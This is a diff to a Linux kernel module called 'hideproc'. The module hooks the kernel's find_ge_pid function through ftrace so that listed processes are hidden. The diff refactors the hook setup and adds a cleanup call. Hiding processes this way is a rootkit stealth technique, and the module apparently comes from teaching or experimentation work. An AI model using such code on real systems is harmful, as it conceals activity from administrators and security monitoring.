@@ -1,3 +1,4 @@
+#include "hideproc.h"
 #include <linux/cdev.h>
 #include <linux/ftrace.h>
 #include <linux/kallsyms.h>
@@ -82,8 +83,6 @@ LIST_HEAD(hidden_proc);
 typedef struct pid *(*find_ge_pid_func)(int nr, struct pid_namespace *ns);
 static find_ge_pid_func real_find_ge_pid;
 
-static struct ftrace_hook hook;
-
 static bool is_hidden_proc(pid_t pid) {
     pid_node_t *proc, *tmp_proc;
     list_for_each_entry_safe(proc, tmp_proc, &hidden_proc, list_node) {
@@ -100,11 +99,9 @@ static struct pid *hook_find_ge_pid(int nr, struct pid_namespace *ns) {
     return pid;
 }
 
+static struct ftrace_hook hook = HOOK("find_ge_pid", hook_find_ge_pid, &real_find_ge_pid);
+
 static void init_hook(void) {
-    real_find_ge_pid = (find_ge_pid_func)kallsyms_lookup_name("find_ge_pid");
-    hook.name = "find_ge_pid";
-    hook.func = hook_find_ge_pid;
-    hook.orig = &real_find_ge_pid;
     hook_install(&hook);
 }
 
@@ -219,6 +216,7 @@ static int _hideproc_init(void) {
 static void _hideproc_exit(void) {
     printk(KERN_INFO "@ %s\n", __func__);
     /* FIXME: ensure the release of all allocated resources */
+    class_destroy(hideproc_class);
 }
 
 module_init(_hideproc_init);
